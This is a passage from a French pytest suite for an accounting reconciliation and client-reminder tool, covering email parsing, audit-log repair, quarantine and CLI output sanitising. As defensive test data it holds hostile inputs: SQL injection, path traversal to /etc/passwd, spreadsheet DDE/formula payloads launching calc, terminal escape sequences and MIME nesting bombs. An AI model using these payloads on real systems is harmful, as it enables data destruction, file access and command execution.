    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=[OPERATIONS[0]])
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(J0))
    try:
        cycle.envoyer_relance(inst, b.id_relance, maintenant=a(J0))
    except envoi.ErreurEnvoi:
        pass
    for f in inst.outbox.glob("*.eml"):
        msg = BytesParser(policy=policy.default).parsebytes(f.read_bytes())
        assert msg["Bcc"] is None


def test_sain_injection_sql_et_traversee_par_codes_et_references(tmp_path) -> None:
    code = "../../../evasion"
    ref = "x'); DROP TABLE pieces; --"
    dossiers = [[code, "Evasion", "compta@evasion.fr", "M", "15", "courtois", "C-DIRECT", ""]]
    ops = [[code, "2026-09-03", "CB LOXAM", "120.00", "", ref, "EUR"]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=ops)
    inst = nouvelle_instance(tmp_path / "x" / "y" / "i")
    avant = set(tmp_path.rglob("*"))
    lancer(entree, inst, J0)
    apres = set(tmp_path.rglob("*")) - avant
    assert all(inst.racine in p.parents for p in apres), apres
    assert [(p.dossier, p.reference) for p in cycle.pieces(inst)] == [(code, ref)]


def test_sain_nom_de_piece_jointe_traversee(tmp_path) -> None:
    for nom in ("../../depot.sqlite", "..\\..\\x.pdf", "/etc/passwd", "∕etc∕passwd"):
        (tmp_path / "m.eml").write_bytes(eml("a@b.fr", "<x@y>", fichiers=((nom, b"x"),)))
        [f] = routage.lire_eml(tmp_path / "m.eml").fichiers
        assert "/" not in f.nom and "\\" not in f.nom and f.nom not in ("..", ".")


# ===========================================================================
# 5. Donnees degenerees
# ===========================================================================


def test_regression_devise_ignoree_par_le_moteur() -> None:
    op = OperationBancaire("R1", "A", dt.date(2026, 9, 3), "CB LOXAM", Decimal("100.00"), Sens.DEBIT, devise="USD")
    pc = Piece("P1", "A", "f.pdf", "LOXAM", dt.date(2026, 9, 2), Decimal("100.00"), devise="EUR")
    [r] = Moteur().rapprocher([op], [pc])
    assert r.statut is not Statut.JUSTIFIE
    # Temoin : meme devise, le rapprochement fonctionne toujours (pas un moteur casse).
    [r] = Moteur().rapprocher([op], [Piece("P2", "A", "f.pdf", "LOXAM", dt.date(2026, 9, 2),
                                            Decimal("100.00"), devise="USD")])
    assert r.statut is Statut.JUSTIFIE


def _imbrique(n: int) -> bytes:
    corps = b"Content-Type: text/plain\r\n\r\nx\r\n"
    for _ in range(n):
        corps = b"Content-Type: message/rfc822\r\n\r\n" + corps
    return b"From: inconnu@evil.example\r\nMessage-ID: <bombe@x>\r\nMIME-Version: 1.0\r\n" + corps


def test_regression_eml_imbrique_bloque_tout_le_cycle(entree: Path, inst: cycle.Instance) -> None:
    (inst.entrant / "0-bombe.eml").write_bytes(_imbrique(1000))
    (inst.entrant / "1.eml").write_bytes(eml("compta@alpha-sarl.fr", "<ok@x>", objet="facture 120,00 EUR",
                                             fichiers=(("f_2026-09.pdf", b"%PDF"),)))
    resume = lancer(entree, inst, J0)
    assert resume.brouillons_crees == 2 and resume.propositions == 1
    assert resume.quarantaine == 1
    with open(inst.sortie / "quarantaine.csv", encoding="utf-8") as f:
        lignes = list(csv.reader(f))
    assert [l[0] for l in lignes[1:]] == ["0-bombe.eml"] and "RecursionError" in lignes[1][2]
    # Retente au cycle suivant, mais journalise une seule fois (pas de flot d'audit).
    assert lancer(entree, inst, J0).quarantaine == 1
    from rapprochement.audit import JournalAudit
    assert sum(e.action == "eml_quarantaine" for e in JournalAudit(inst.audit).lire()) == 1


def test_sain_degeneres_releve_vide_dossier_sans_contact(tmp_path) -> None:
    entree = ecrire_entree(tmp_path / "e", operations=[])
    inst = nouvelle_instance(tmp_path / "i")
    assert lancer(entree, inst, J0).operations == 0
    dossiers = [["ALPHA", "Alpha", "contact@alpha-sarl.fr", "M", "15", "courtois", "C-DIRECT", ""]]
    ops = [["ALPHA", "2026-09-03", "CB", "0.00", "", "Z", "EUR"],               # montant nul : ignore
           ["ALPHA", "2026-09-03", "CB", "-12.5", "", "N", "EUR"],               # negatif
           ["ALPHA", "2099-01-01", "CB", "99999999999.12345", "", "G", "EUR"]]  # futur, enorme, 5 decimales
    entree = ecrire_entree(tmp_path / "e2", dossiers=dossiers, operations=ops)
    inst = nouvelle_instance(tmp_path / "i2")
    r = lancer(entree, inst, J0)
    # Montant nul ignore, aucune exception ; le debit enorme a 5 decimales (date future) est une
    # operation comme une autre : une relance au plus, vers le contact declare.
    assert r.operations == 2 and r.manquants + r.a_verifier == 2 and r.brouillons_crees <= 1


def test_sain_message_id_rejoue_avec_autre_contenu(entree, inst) -> None:
    for i, contenu in enumerate((b"%PDF un", b"%PDF deux", b"")):
        (inst.entrant / f"{i}.eml").write_bytes(eml("compta@alpha-sarl.fr", "<meme@x>",
                                                    fichiers=(("f.pdf", contenu),)))
    r = lancer(entree, inst, J0)
    assert r.doublons == 0 and len(cycle.lister_file(inst)) == 3
    assert lancer(entree, inst, J0).doublons == 3


def test_sain_2000_pieces_jointes(tmp_path) -> None:
    fichiers = tuple((f"f{i}.pdf", f"%PDF {i}".encode()) for i in range(2000))
    (tmp_path / "m.eml").write_bytes(eml("jean@client-a.fr", "<x@y>", objet="89,90 EUR", fichiers=fichiers))
    t = time.perf_counter()
    msg = routage.lire_eml(tmp_path / "m.eml")
    d = routage.router(msg, adresses=ADRESSES, attendues=[ATTENDUE_A], aujourdhui=J0)
    assert len(d) == 2000 and time.perf_counter() - t < 30


# ===========================================================================
# 6. CA-08 / CA-10 : reproductibilite et reprise
# ===========================================================================


def _cycle_cli(entree: Path, inst: Path, env_extra: dict[str, str]) -> None:
    env = {**os.environ, **env_extra}
    subprocess.run([sys.executable, str(RACINE / "scripts" / "cycle.py"), "cycle", "--instance", str(inst),
                    "--entree", str(entree), "--date", J0.isoformat()], check=True, env=env,
                   capture_output=True)


def _empreintes(racine: Path) -> dict[str, str]:
    return {str(p.relative_to(racine)): hashlib.sha256(p.read_bytes()).hexdigest()
            for p in sorted(racine.rglob("*")) if p.is_file() and p.suffix != ".sqlite"
            and not p.name.startswith("depot.sqlite")}


def test_sain_ca08_independant_du_fuseau_de_la_locale_et_du_hash(tmp_path) -> None:
    entree = ecrire_entree(tmp_path / "e")
    instances = []
    messages = [eml(exp, f"<{k}@x>", objet="120,00 EUR", fichiers=((nom, b"%PDF"),))
                for k, (exp, nom) in enumerate((("compta@alpha-sarl.fr", "z_2026-09.pdf"),
                                                ("contact@beta-sas.fr", "a.pdf"), ("x@gmail.com", "b.pdf")))]
    for i, env in enumerate(({"TZ": "Pacific/Kiritimati", "PYTHONHASHSEED": "1", "LC_ALL": "C"},
                             {"TZ": "America/Adak", "PYTHONHASHSEED": "4242", "LC_ALL": "C.UTF-8"})):
        rep = tmp_path / f"i{i}"
        nouvelle_instance(rep)
        for k, brut in enumerate(messages):
            (rep / "entrant" / f"{3 - k}.eml").write_bytes(brut)
        _cycle_cli(entree, rep, env)
        instances.append(_empreintes(rep))
    assert instances[0] == instances[1]
    assert any(k.startswith("sortie/") for k in instances[0])


def test_regression_journal_tronque_refus_avant_ecriture_puis_reparation(tmp_path) -> None:
    """Contrat : journal tronque -> refus explicite AVANT toute ecriture en base ;
    `reparer-audit` retire la fin tronquee (sauvegardee) ; le cycle reprend normalement."""
    from rapprochement.audit import JournalAudit
    entree = ecrire_entree(tmp_path / "e", operations=[OPERATIONS[0]])
    inst = avec_responsable(nouvelle_instance(tmp_path / "i"))
    lancer(entree, inst, J0)
    sain = inst.audit.read_bytes()
    with open(inst.audit, "ab") as f:
        f.write(b'{"acteur":"systeme","action":"pie')          # ecriture interrompue
    ecrire_entree(tmp_path / "e", operations=OPERATIONS)
    avant_depot = etat_brut(inst)
    j1 = J0 + dt.timedelta(days=1)
    with pytest.raises(cycle.JournalNonSain):
        lancer(entree, inst, j1)
    assert etat_brut(inst) == avant_depot
    # Les decisions humaines sont refusees aussi, sans ecriture.
    b = brouillon_de(inst, "compta@alpha-sarl.fr")
    with pytest.raises(cycle.JournalNonSain):
        cycle.valider_relance(inst, b.id_relance, VALIDEUSE, maintenant=a(j1))
    assert etat_brut(inst) == avant_depot
    # Reparation par la CLI, au nom d'un validateur declare.
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", j1.isoformat()]
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 1
    assert cli.main(["reparer-audit", "--par", "Mallory", *base]) == 1
    assert cli.main(["reparer-audit", "--par", VALIDEUSE, *base]) == 1       # validateur simple : refus
    assert len(inst.audit.read_bytes()) > len(sain)                           # rien n'a ete retire
    assert cli.main(["reparer-audit", "--par", RESPONSABLE, *base]) == 0
    [fragment] = list(inst.racine.glob("audit.jsonl.fragment-*"))
    assert fragment.read_bytes() == b'{"acteur":"systeme","action":"pie'
    assert inst.audit.read_bytes().startswith(sain)
    assert cycle.verifier_audit(inst).ok
    derniere = JournalAudit(inst.audit).lire()[-1]
    assert (derniere.action, derniere.acteur) == ("journal_repare", RESPONSABLE)
    assert cli.main(["reparer-audit", "--par", RESPONSABLE, *base]) == 0    # idempotent
    assert len(list(inst.racine.glob("audit.jsonl.fragment-*"))) == 1
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    assert {p.reference for p in cycle.pieces(inst)} == {"A-001", "A-002", "B-001"}
    assert cli.main(["verifier-audit", *base]) == 0


def etat_brut(inst: cycle.Instance) -> tuple:
    with Depot(inst.depot) as d:
        return (d.charger_pieces(), d.lister_brouillons(), d.file_humaine(resolue=None),
                d.historique_envois())


# ===========================================================================
# 7. CA-09 : performance
# ===========================================================================


def _gros_releve(rep: Path, n: int, n_dossiers: int = 20) -> Path:
    import random
    rnd = random.Random(7)
    dossiers = [[f"D{i:02d}", f"Societe {i}", f"compta@societe{i}.fr", "X", "15", "courtois", "C-DIRECT", ""]
                for i in range(n_dossiers)]
    fourn = ["LOXAM", "ORANGE", "EDF", "METRO", "CASTORAMA", "AMAZON", "TOTAL", "SNCF", "OVH", "FREE"]
    ops, pieces = [], []
    for i in range(n):
        d = dt.date(2026, 7, 1) + dt.timedelta(days=rnd.randrange(90))
        m = f"{rnd.randrange(1000, 500000) / 100:.2f}"
        fo = rnd.choice(fourn)
        ops.append([f"D{i % n_dossiers:02d}", d.isoformat(), f"CB {fo} {i}", m, "", f"R{i:06d}", "EUR"])
        if i % 3 == 0:
            pieces.append([f"P{i}", f"D{i % n_dossiers:02d}", f"p{i}.pdf", fo,
                           (d - dt.timedelta(days=2)).isoformat(), m, "EUR"])
    return ecrire_entree(rep, dossiers=dossiers, operations=ops, pieces=pieces)


def test_sain_ca09_5000_operations_20_dossiers_100_emails(tmp_path) -> None:
    entree = _gros_releve(tmp_path / "e", 5000)
    inst = nouvelle_instance(tmp_path / "i")
    for k in range(100):
        (inst.entrant / f"{k:04d}.eml").write_bytes(eml(
            f"compta@societe{k % 20}.fr", f"<{k}@x>", objet=f"facture {k + 10},00 EUR",
            fichiers=((f"f{k}.pdf", f"%PDF {k}".encode()),)))
    t = time.perf_counter()
    r = lancer(entree, inst, J0)
    duree = time.perf_counter() - t
    assert r.operations == 5000 and r.brouillons_crees == 20
    assert duree < 600, duree   # cible CA-09 ; mesure de reference : ~7 s


# ===========================================================================
# 8. Second passage : code nouveau (reparation du journal, quarantaine,
#    neutralisation, affichage, deblocage, domaines declares) et boucle CLI
# ===========================================================================

from rapprochement.audit import JournalAudit, JournalCorrompu  # noqa: E402
from rapprochement.parseurs import ErreurFormat  # noqa: E402


def _journal(tmp_path: Path, n: int = 4) -> JournalAudit:
    j = JournalAudit(tmp_path / "audit.jsonl")
    for i in range(n):
        j.ecrire("systeme", "action", f"objet-{i}", {"i": i},
                 horodatage=dt.datetime(2026, 10, 5, 10, i, tzinfo=dt.timezone.utc))
    return j


def _fragments(tmp_path: Path) -> list[Path]:
    return sorted(tmp_path.glob("audit.jsonl.fragment-*"))


def test_sain_reparer_refuse_fin_tronquee_plus_alteration_au_milieu(tmp_path) -> None:
    """Une falsification au milieu + une fin tronquee : rien n'est modifie, la preuve reste."""
    j = _journal(tmp_path)
    lignes = j.chemin.read_bytes().split(b"\n")
    lignes[1] = lignes[1].replace(b'"objet-1"', b'"objet-X"')
    j.chemin.write_bytes(b"\n".join(lignes) + b'{"seq":5,"acte')
    avant = j.chemin.read_bytes()
    with pytest.raises(JournalCorrompu):
        j.reparer_fin_tronquee()
    assert j.chemin.read_bytes() == avant and _fragments(tmp_path) == []
    r = j.verifier()
    assert not r.ok and r.premiere_erreur_seq == 2


@pytest.mark.parametrize("alteration", ["derniere_complete_modifiee", "seq_saute", "ligne_vide_au_milieu"])
def test_sain_reparer_ne_blanchit_pas_une_entree_complete(tmp_path, alteration) -> None:
    j = _journal(tmp_path)
    lignes = j.chemin.read_bytes().split(b"\n")[:-1]
    if alteration == "derniere_complete_modifiee":
        lignes[-1] = lignes[-1].replace(b'"objet-3"', b'"objet-Z"')
    elif alteration == "seq_saute":
        del lignes[2]
    else:
        lignes.insert(2, b"")
    j.chemin.write_bytes(b"\n".join(lignes) + b"\n" + b'{"seq":9')
    avant = j.chemin.read_bytes()
    with pytest.raises(JournalCorrompu):
        j.reparer_fin_tronquee()
    assert j.chemin.read_bytes() == avant and _fragments(tmp_path) == []


def test_regression_reparer_retire_une_entree_complete_sans_saut_de_ligne(tmp_path) -> None:
    j = _journal(tmp_path)
    j.chemin.write_bytes(j.chemin.read_bytes()[:-1])           # seul le '\n' final manque
    j.reparer_fin_tronquee()
    r = j.verifier()
    assert r.ok and r.nb_entrees == 4


def test_sain_reparations_concurrentes_et_collision_de_fragment(tmp_path) -> None:
    j = _journal(tmp_path)
    sain = j.chemin.read_bytes()
    j.chemin.write_bytes(sain + b'{"seq":5,"ac')
    # Noms de fragment deja pris pour les secondes a venir : jamais ecrases.
    maintenant = dt.datetime.now(dt.timezone.utc)
    pieges = []
    for k in range(-1, 6):
        nom = (maintenant + dt.timedelta(seconds=k)).strftime("%Y%m%dT%H%M%SZ")
        piege = tmp_path / f"audit.jsonl.fragment-{nom}"
        piege.write_bytes(b"NE PAS ECRASER")
        pieges.append(piege)
    resultats: list[int] = []
    depart = threading.Barrier(4)

    def reparer() -> None:
        depart.wait()
        resultats.append(JournalAudit(j.chemin).reparer_fin_tronquee())

    fils = [threading.Thread(target=reparer) for _ in range(4)]
    for f in fils:
        f.start()
    for f in fils:
        f.join()
    assert sorted(resultats) == [0, 0, 0, len(b'{"seq":5,"ac')]
    assert all(p.read_bytes() == b"NE PAS ECRASER" for p in pieges)
    nouveaux = [f for f in _fragments(tmp_path) if f not in pieges]
    assert len(nouveaux) == 1 and nouveaux[0].read_bytes() == b'{"seq":5,"ac'
    assert j.chemin.read_bytes() == sain and j.verifier().ok


def test_regression_en_tete_from_quadratique_ralentit_tout_le_cycle(entree, inst) -> None:
    (inst.entrant / "lourd.eml").write_bytes(
        b"From: " + b"=?utf-8?q?a?= " * 8000 + b"<a@b.fr>\r\nMessage-ID: <lourd@x>\r\n\r\nx\r\n")
    t = time.perf_counter()
    r = lancer(entree, inst, J0)
    assert time.perf_counter() - t < 1.0
    assert r.quarantaine == 1
    assert "bloc d'en-tetes" in cellules(inst.sortie / "quarantaine.csv")[2]


def test_sain_quarantaine_fichiers_pathologiques(entree, inst, capsys) -> None:
    """Octets nuls, charset inconnu, 8 bits bruts, boucle de frontieres, nom piege :
    le cycle va au bout, les autres messages sont traites, rien ne pilote le terminal."""
    H = b"From: inconnu@evil.example\r\nMessage-ID: <%d@x>\r\n"
    (inst.entrant / "1-nul.eml").write_bytes(H % 1 + b"Subject: a\x00b\r\n\r\n\x00\x00\r\n")
    (inst.entrant / "2-charset.eml").write_bytes(
        H % 2 + b"Content-Type: text/plain; charset=foobar\r\n\r\n12,00 EUR\r\n")
    (inst.entrant / "3-8bit.eml").write_bytes(
        H % 3 + b"Subject: \xff\xfe\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n"
        b"--b\r\nContent-Disposition: attachment; filename=\"f\xff\x1b[2J.pdf\"\r\n\r\nPDF\r\n--b--\r\n")
    (inst.entrant / "4-boucle.eml").write_bytes(
        H % 4 + b"MIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n"
        + b"--b\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n" * 2000 + b"--b--\r\n")
    (inst.entrant / "5-\x1b]52;c;cGF3bmVk\x07=HYPERLINK(1).eml").write_bytes(_imbrique(1000))
    (inst.entrant / "6-ok.eml").write_bytes(eml("compta@alpha-sarl.fr", "<ok@x>", objet="facture 120,00 EUR",
                                                fichiers=(("f_2026-09.pdf", b"%PDF"),)))
    capsys.readouterr()
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    assert cli.main(["file", *base]) == 0
    sortie = capsys.readouterr().out
    assert not [c for c in sortie if c not in "\n" and unicodedata.category(c) in ("Cc", "Cf")]
    r = lancer(entree, inst, J0)
    assert r.propositions == 0 and r.doublons >= 1             # 6-ok deja propose
    quarantaine = cellules(inst.sortie / "quarantaine.csv")
    assert not [c for c in quarantaine if c.startswith(CARACTERES_FORMULE)]
    assert any(c.startswith("5-") for c in quarantaine)
    assert [d.dossier for d in cycle.lister_file(inst) if d.statut is StatutRoutage.PROPOSEE] == ["ALPHA"]


@pytest.mark.parametrize("valeur", [
    "=1+1", "+1+cmd|' /C calc'!A0", "-2+3", "@SUM(A1)", "\t=1", "\r=1",
    "=HYPERLINK(\"http://x\")\n=1", "-cmd|' /C calc'!A0", "=DDE(\"cmd\";\"/C calc\";\"x\")",
    "+33 6 12 34 56 78", "-", "=", "@",
])
def test_sain_neutraliser_formule_contrat(valeur) -> None:
    from rapprochement.rapport import neutraliser_formule
    n = neutraliser_formule(valeur)
    assert n == "'" + valeur


@pytest.mark.parametrize("valeur", ["-12.50", "+3", "-0,5", "12", "texte", "", "1=1"])
def test_sain_neutraliser_formule_laisse_les_nombres_et_le_texte(valeur) -> None:
    from rapprochement.rapport import neutraliser_formule
    assert neutraliser_formule(valeur) == valeur


@pytest.mark.parametrize("piege", ["\x9b2J", "\x1b]52;c;cGF3bmVk\x07", "\rFAUX", "\x08\x08\x08X",
                                   "‮gnp.exe", "\x85NEL", "\x1bc", " L", "\x7f"])
def test_sain_affichable_cli_file_et_pieces(tmp_path, capsys, piege) -> None:
    """Toute valeur externe affichee (Message-ID, nom de piece jointe, code, reference)."""
    dossiers = [["AL" + piege, "Alpha", "compta@alpha-sarl.fr", "M", "15", "courtois", "C-DIRECT", ""]]
    ops = [["AL" + piege, "2026-09-03", "CB" + piege, "120.00", "", "R" + piege, "EUR"]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    brut = eml("inconnu@evil.example", "<x@y>", fichiers=(("f.pdf", b"%PDF"),))
    brut = brut.replace(b"Message-ID: <x@y>", b"Message-ID: " + ("M" + piege).encode("utf-8"))
    (inst.entrant / "1.eml").write_bytes(brut)
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    capsys.readouterr()
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    assert cli.main(["file", *base]) == 0
    assert cli.main(["pieces", *base]) == 0
    assert cli.main(["valider", "x" + piege, "--par", VALIDEUSE, *base]) == 1
    sorties = capsys.readouterr()
    for flux in (sorties.out, sorties.err):
        assert not [c for c in flux if c != "\n" and unicodedata.category(c) in ("Cc", "Cf", "Zl", "Zp")]


def _piece_cli(inst, *args) -> int:
    return charger_cli().main([*args, "--instance", str(inst.racine), "--date", J0.isoformat()])


@pytest.mark.parametrize("motif", ["[cycle] litige", "  [cycle] litige", "[cycle]", "[cycle]x"])
def test_sain_bloquer_refuse_le_prefixe_du_cycle(entree, inst, motif) -> None:
    lancer(entree, inst, J0)
    assert _piece_cli(inst, "bloquer", "--dossier", "ALPHA", "--reference", "A-001",
                      "--par", VALIDEUSE, "--motif", motif) == 1
    assert not {p.reference: p for p in cycle.pieces(inst)}["A-001"].bloquee


@pytest.mark.parametrize("motif", ["[CYCLE] litige", "​[cycle] litige", "［cycle］ litige"])
def test_sain_blocage_manuel_jamais_leve_par_le_cycle_ni_rattacher(entree, inst, motif) -> None:
    lancer(entree, inst, J0)
    assert _piece_cli(inst, "bloquer", "--dossier", "ALPHA", "--reference", "A-001",
                      "--par", VALIDEUSE, "--motif", motif) == 0
    lancer(entree, inst, J0 + dt.timedelta(days=1))
    assert {p.reference: p for p in cycle.pieces(inst)}["A-001"].bloquee
    p = cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a(J0 + dt.timedelta(days=1)),
                              dossier="ALPHA", reference="A-001", id_piece="P1")
    assert p.bloquee and p.motif_blocage == motif.strip()
    assert lancer(entree, inst, J0 + dt.timedelta(days=2)).blocages_leves == 0


@pytest.mark.xfail(strict=True, reason=(
    "LIMITE ASSUMEE (docs/architecture_mvp.md section 7). "
    "Le deblocage humain est memorise PAR PIECE (`deblocage-humain:<dossier>/<ref>`), pas par "
    "constat du moteur comme l'annonce `debloquer_piece` : une fois debloquee, la piece n'est "
    "plus jamais rebloquee, meme quand une AUTRE facture la justifie ; le client continue "
    "d'etre relance pour une piece que le cabinet a deja."))
def test_defaut_deblocage_humain_ignore_un_nouveau_constat(tmp_path) -> None:
    ops = [OPERATIONS[0]]
    entree = ecrire_entree(tmp_path / "e", operations=ops)
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    j1, j2 = J0 + dt.timedelta(days=1), J0 + dt.timedelta(days=2)
    ecrire_entree(tmp_path / "e", operations=ops,
                  pieces=[["P1", "ALPHA", "p1.pdf", "LOXAM", "2026-09-02", "120.00", "EUR"]])
    lancer(entree, inst, j1)
    assert {p.reference: p for p in cycle.pieces(inst)}["A-001"].bloquee
    cycle.debloquer_piece(inst, "ALPHA", "A-001", VALIDEUSE, motif="P1 est une autre location",
                          maintenant=a(j1))
    ecrire_entree(tmp_path / "e", operations=ops,
                  pieces=[["P2", "ALPHA", "p2.pdf", "LOXAM", "2026-09-03", "120.00", "EUR"]])
    lancer(entree, inst, j2)
    assert {p.reference: p for p in cycle.pieces(inst)}["A-001"].bloquee


def test_sain_domaines_declares_temoins(tmp_path) -> None:
    from rapprochement.modeles import Dossier
    dossiers = {
        "A": Dossier("A", "A", "jean@client-a.fr", "J", domaines=("CLIENT-A.FR.", "gmail.com")),
        "B": Dossier("B", "B", "paul@client-b.fr", "P", domaines=("partage.fr",)),
        "C": Dossier("C", "C", "x@client-c.fr", "X", domaines=("Partage.FR",)),
    }
    adresses = routage.adresses_par_dossier(dossiers)
    domaines = routage.domaines_par_dossier(dossiers)
    assert domaines["A"] == frozenset({"client-a.fr"})          # gmail.com ecarte

    def dossier_de(exp: str):
        m = MessageEntrant("<x@y>", exp, dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc),
                           "facture 89,90 EUR", "", (FichierEntrant("f.pdf", b"P"),))
        [d] = routage.router(m, adresses=adresses, attendues=[ATTENDUE_A, ATTENDUE_B],
                             aujourdhui=J0, domaines=domaines)
        return d.dossier, d.statut, d.motif

    assert dossier_de("autre@client-a.fr")[:2] == ("A", StatutRoutage.PROPOSEE)
    assert dossier_de("jean+factures@client-a.fr")[:2] == ("A", StatutRoutage.PROPOSEE)
    assert dossier_de("x@mail.client-a.fr")[0] is None             # sous-domaine
    assert dossier_de("x@gmail.com")[0] is None                    # grand public declare : ignore
    assert dossier_de("x@partage.fr")[2] is MotifNonRoute.DOSSIER_AMBIGU
    assert dossier_de("x@xn--client-a-x.fr")[0] is None


def test_regression_domaine_declare_idna2003_replie_sur_un_autre_domaine() -> None:
    from rapprochement.modeles import Dossier
    dossiers = {"A": Dossier("A", "A", "jean@xn--strae-oqa.de", "J", domaines=("straße.de",))}
    m = MessageEntrant("<x@y>", "compta@strasse.de", dt.datetime(2026, 10, 1, tzinfo=dt.timezone.utc),
                       "facture 89,90 EUR", "", (FichierEntrant("f.pdf", b"P"),))
    d = routage.router(m, adresses=routage.adresses_par_dossier(dossiers), attendues=[ATTENDUE_A],
                       aujourdhui=J0, domaines=routage.domaines_par_dossier(dossiers))
    assert all(x.dossier is None for x in d), d


@pytest.mark.parametrize("domaines", ["client a.fr", "jean@client-a.fr", "localhost"])
def test_regression_cli_domaines_malformes_trace_au_lieu_d_un_refus(tmp_path, capsys, domaines) -> None:
    dossiers = [DOSSIERS[0][:8] + [domaines], DOSSIERS[1][:8] + [""]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers)
    lignes = (entree / "dossiers.csv").read_text(encoding="utf-8").splitlines()
    lignes[0] += ",domaines"
    (entree / "dossiers.csv").write_text("\n".join(lignes) + "\n", encoding="utf-8")
    inst = nouvelle_instance(tmp_path / "i")
    code = charger_cli().main(["cycle", "--entree", str(entree), "--instance", str(inst.racine),
                               "--date", J0.isoformat()])
    assert code == 1 and "domaine" in capsys.readouterr().err


@pytest.mark.xfail(strict=True, reason=(
    "LIMITE ASSUMEE (docs/architecture_mvp.md section 7). "
    "Incoherence introduite par le correctif : le routage considere `jean+b@x.fr` et "
    "`jean@x.fr` comme la MEME boite (suffixe +tag), mais la planification et la limite "
    "hebdomadaire les traitent comme deux destinataires : deux e-mails le meme jour a la meme "
    "personne."))
def test_defaut_plus_tag_meme_boite_pour_le_routage_pas_pour_les_relances(tmp_path) -> None:
    dossiers = [["ALPHA", "Alpha", "jean@relais-x.fr", "J", "15", "courtois", "C-DIRECT", ""],
                ["BETA", "Beta", "jean+beta@relais-x.fr", "J", "15", "courtois", "C-DIRECT", ""]]
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers)
    inst = nouvelle_instance(tmp_path / "i")
    assert lancer(entree, inst, J0).brouillons_crees == 1


def test_sain_boucle_cli_des_correctifs(tmp_path, capsys) -> None:
    """Chaque correctif rejoue de bout en bout par la CLI."""
    dossiers = [["ALPHA", "Alpha SARL", "gerant.alpha@hotmail.ca", "M. Alpha", "15", "courtois", "C-DIRECT", ""],
                ["CAFÉ", "Cafe", "compta@cafe.fr", "M", "15", "courtois", "C-DIRECT", ""]]
    ops = [["ALPHA", "2026-09-03", FORMULE_LIBELLE, "120.00", "", "A-001", "USD"],
           ["CAFÉ", "2026-09-04", "CB LOXAM", "50.00", "", "C-001", "EUR"]]
    pieces = [["P1", "ALPHA", "p.pdf", "HYPERLINK", "2026-09-02", "120.00", "EUR"]]   # mauvaise devise
    entree = ecrire_entree(tmp_path / "e", dossiers=dossiers, operations=ops, pieces=pieces)
    inst = nouvelle_instance(tmp_path / "i", None)
    inst.validateurs.write_bytes("﻿Marie Durand\r\n".encode("utf-8"))
    (inst.entrant / "0-bombe.eml").write_bytes(_imbrique(1000))
    (inst.entrant / "1.eml").write_bytes(eml("inconnu@hotmail.ca", "<p@x>", objet="facture 120,00 EUR",
                                             fichiers=(("facture_2026-09.pdf", b"%PDF"),)))
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", J0.isoformat()]
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    assert {p.reference for p in cycle.pieces(inst)} == {"A-001", "C-001"}    # devise, NFC
    assert [d.statut for d in cycle.lister_file(inst)] == [StatutRoutage.NON_ROUTEE]   # domaine
    assert not [c for f in inst.sortie.glob("*.csv") for c in cellules(f) if c.startswith(CARACTERES_FORMULE)]
    ids = sorted(b.id_relance for b in cycle.brouillons(inst, StatutBrouillon.BROUILLON))
    assert len(ids) == 2
    for i in ids:
        assert cli.main(["valider", i, "--par", "marie durand", *base]) == 0       # BOM
    # Apres tous les correctifs, un envoi valide reste possible, et une seule fois.
    assert cli.main(["envoyer", ids[0], "--par", "marie durand", *base]) == 0
    assert cli.main(["envoyer", ids[0], "--par", "marie durand", *base]) == 1
    assert len(list(inst.outbox.glob("*.eml"))) == 1
    assert cli.main(["verifier-audit", *base]) == 0


def test_sain_cli_envoi_incertain_bloque_le_suivant(tmp_path, capsys) -> None:
    entree = ecrire_entree(tmp_path / "e")
    inst = nouvelle_instance(tmp_path / "i")
    lancer(entree, inst, J0)
    b1 = brouillon_de(inst, "compta@alpha-sarl.fr")
    cycle.valider_relance(inst, b1.id_relance, VALIDEUSE, maintenant=a(J0))
    with pytest.raises(TimeoutError):
        cycle.envoyer_relance(inst, b1.id_relance, maintenant=a(J0), expediteur=_Coupure())
    j1 = J0 + dt.timedelta(days=1)
    for ref in ("A-001", "A-002"):
        cycle.rattacher_piece(inst, VALIDEUSE, maintenant=a(j1), dossier="ALPHA", reference=ref, id_piece=ref)
    ecrire_entree(tmp_path / "e", operations=OPERATIONS + [
        ["ALPHA", "2026-10-02", "CB AMAZON", "33.00", "", "A-005", "EUR"]])
    cli = charger_cli()
    base = ["--instance", str(inst.racine), "--date", j1.isoformat()]
    assert cli.main(["cycle", "--entree", str(entree), *base]) == 0
    b2 = brouillon_de(inst, "compta@alpha-sarl.fr")
    assert cli.main(["valider", b2.id_relance, "--par", VALIDEUSE, *base]) == 0
    capsys.readouterr()
    assert cli.main(["envoyer", b2.id_relance, "--par", VALIDEUSE, *base]) == 1
    assert "EnvoiIncertainEnAttente" in capsys.readouterr().err
    assert list(inst.outbox.glob("*.eml")) == []


# ===========================================================================
# 9. Troisieme passage : isolation de la lecture des .eml (enfant borne)
# ===========================================================================

import os as _os  # noqa: E402
import signal as _signal  # noqa: E402


def _enfants_vivants() -> list[int]:
    """PID des processus dont le parent est ce processus (zombies compris)."""
    moi, trouves = _os.getpid(), []
    for d in _os.listdir("/proc"):
        if d.isdigit():
            try:
